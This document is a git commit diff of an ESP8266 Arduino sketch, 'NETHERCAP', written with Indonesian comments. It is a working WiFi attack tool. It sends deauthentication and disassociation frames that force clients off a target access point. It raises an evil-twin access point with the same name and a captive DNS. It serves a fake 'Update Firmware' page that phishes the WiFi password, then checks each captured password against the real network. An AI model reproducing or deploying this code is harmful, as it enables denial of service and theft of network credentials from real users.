4df98fc7feed80f83eb151dfdf059ee6be55093a
ibaru2319-debug <ibaru2319@gmail.com>
2026-02-01 08:12:12 +0800

    Refactor OLED display updates and improve logic

--- GMpro87.ino
+++ GMpro87.ino
@@ -8,17 +8,17 @@
 
 extern "C" {
 #include "user_interface.h"
+// Wajib agar fungsi deauth tidak error di SDK 2.0.0
 int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
 }
 
-// Konfigurasi OLED 64x48
+// Konfigurasi OLED 0.66" (64x48)
 #define SCREEN_WIDTH 64
 #define SCREEN_HEIGHT 48
-#define OLED_RESET    -1 
+#define OLED_RESET    -1
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
-// Pin LED untuk fitur Blink
-#define LED_PIN 2 // LED internal ESP8266 (GPIO2)
+#define LED_PIN 2 // LED Internal untuk fitur Blink
 
 typedef struct {
   String ssid;
@@ -33,7 +33,7 @@ ESP8266WebServer webServer(80);
 
 _Network _networks[16];
 _Network _selectedNetwork;
-String _whitelistMAC = "";
+String _whitelistMAC = ""; 
 String _correct = "";
 String _tryPassword = "";
 bool hotspot_active = false;
@@ -41,17 +41,17 @@ bool deauthing_active = false;
 unsigned long now = 0;
 unsigned long deauth_now = 0;
 
-// Fungsi Tampilan OLED ala Nethercap
-void updateOLED(String msg) {
+// Update Tampilan OLED ala Nethercap
+void updateOLED(String msg1, String msg2 = "") {
   display.clearDisplay();
   display.setTextSize(1);
   display.setTextColor(SSD1306_WHITE);
   display.setCursor(0,0);
   display.println("NETHERCAP");
   display.println("---------");
-  display.println(msg);
-  if(deauthing_active) display.println("ATTACKING!");
-  if(hotspot_active)   display.println("EVIL-ON");
+  display.println(msg1);
+  if(msg2 != "") display.println(msg2);
+  if(deauthing_active) display.println("ATTACK!");
   display.display();
 }
 
@@ -78,14 +78,13 @@ void performScan() {
 
 void handleResult() {
   if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(200, "text/html", "<html><body style='background:#000;color:red;'><h1>WRONG!</h1></body></html>");
-    updateOLED("WRONG PASS");
+    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:red;text-align:center;font-family:sans-serif;}</style></head><body><h1>GAGAL</h1><p>Password Salah.</p><a href='/'>Ulangi</a></body></html>");
+    updateOLED("WRONG PW");
   } else {
-    _correct = "PASS: " + _tryPassword;
-    hotspot_active = false;
-    deauthing_active = false;
-    updateOLED("PW FOUND!");
-    webServer.send(200, "text/html", "<html><body style='background:#000;color:green;'><h1>SUCCESS!</h1></body></html>");
+    _correct = "PW: " + _tryPassword;
+    hotspot_active = deauthing_active = false;
+    updateOLED("FOUND!", _tryPassword);
+    webServer.send(200, "text/html", "<html><body style='background:#000;color:#0f0;text-align:center;'><h1>BERHASIL</h1><p>Password disimpan.</p></body></html>");
   }
 }
 
@@ -95,26 +94,56 @@ void handleIndex() {
     for (int i = 0; i < 16; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
         _selectedNetwork = _networks[i];
-        updateOLED("SEL: " + _selectedNetwork.ssid);
+        updateOLED("TARGET:", _selectedNetwork.ssid);
       }
     }
   }
   if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
-  
-  // Logic Evil Twin & Phishing (sama seperti sebelumnya)
-  // ... (Sesuai kode sebelumnya untuk handleIndex)
+  if (webServer.hasArg("hotspot")) {
+    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid != "") {
+      hotspot_active = true;
+      WiFi.softAPdisconnect(true);
+      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+    } else {
+      hotspot_active = false;
+      WiFi.softAP("GMpro", "sangkur87");
+    }
+    webServer.sendHeader("Location", "/", true);
+    webServer.send(302, "text/plain", "");
+    return;
+  }
+
+  if (!hotspot_active) {
+    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:#0f0;font-family:monospace;} .btn{border:1px solid #0f0; background:#000; color:#0f0; padding:10px; margin:5px; text-decoration:none; display:inline-block;}</style></head><body>";
+    html += "<h3>NETHERCAP v3.8.3</h3>";
+    html += "<a class='btn' href='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>" + String(deauthing_active ? "STOP DEAUTH" : "START DEAUTH") + "</a>";
+    html += "<a class='btn' href='/?hotspot=start'>EVIL TWIN</a><br><br>";
+    if(_correct != "") html += "<b>" + _correct + "</b><br>";
+    html += "<table>";
+    for (int i = 0; i < 16; i++) {
+      if (_networks[i].ssid == "") break;
+      html += "<tr><td>" + _networks[i].ssid + "</td><td><a class='btn' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SELECT</a></td></tr>";
+    }
+    html += "</table></body></html>";
+    webServer.send(200, "text/html", html);
+  } else {
+    if (webServer.hasArg("password")) {
+      _tryPassword = webServer.arg("password");
+      WiFi.disconnect();
+      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='10;url=/result'></head><body>Verifikasi...</body></html>");
+    } else {
+      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h3>Update Firmware</h3><p>Masukkan Password WiFi " + _selectedNetwork.ssid + "</p><form action='/'><input type='password' name='password'><input type='submit' value='UPDATE'></form></body></html>");
+    }
+  }
 }
 
 void setup() {
   Serial.begin(115200);
   pinMode(LED_PIN, OUTPUT);
-  
-  // Inisialisasi OLED
-  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // Alamat I2C umum 0x3C
-    for(;;); 
-  }
-  updateOLED("STARTING...");
-
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { for(;;); }
+  updateOLED("READY");
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
@@ -122,39 +151,24 @@ void setup() {
   dnsServer.start(DNS_PORT, "*", apIP);
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
+  webServer.onNotFound(handleIndex);
   webServer.begin();
-  
-  updateOLED("READY");
 }
 
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
+  if (deauthing_active) digitalWrite(LED_PIN, (millis() / 100) % 2); else digitalWrite(LED_PIN, HIGH);
 
-  // Efek Blink saat menyerang
-  if (deauthing_active) {
-    digitalWrite(LED_PIN, (millis() / 100) % 2); // Blink cepat
-  } else {
-    digitalWrite(LED_PIN, HIGH); // LED Mati (Active Low)
-  }
-
-  // Serangan Deauth Powerfull (300ms)
-  if (deauthing_active && millis() - deauth_now >= 300) { 
+  if (deauthing_active && millis() - deauth_now >= 300) {
     wifi_set_channel(_selectedNetwork.ch);
-    uint8_t packet[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
-    memcpy(&packet[10], _selectedNetwork.bssid, 6);
-    memcpy(&packet[16], _selectedNetwork.bssid, 6);
-    
-    wifi_send_pkt_freedom(packet, sizeof(packet), 0); // Deauth
-    packet[0] = 0xA0; // Disassociate
-    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
-    
+    uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
+    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
+    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
+    wifi_send_pkt_freedom(pkt, 26, 0);
+    pkt[0] = 0xA0;
+    wifi_send_pkt_freedom(pkt, 26, 0);
     deauth_now = millis();
   }
-
-  if (millis() - now >= 5000) {
-    performScan();
-    now = millis();
-    if(!deauthing_active && !hotspot_active) updateOLED("SCANNING...");
-  }
+  if (millis() - now >= 5000) { performScan(); now = millis(); }
 }
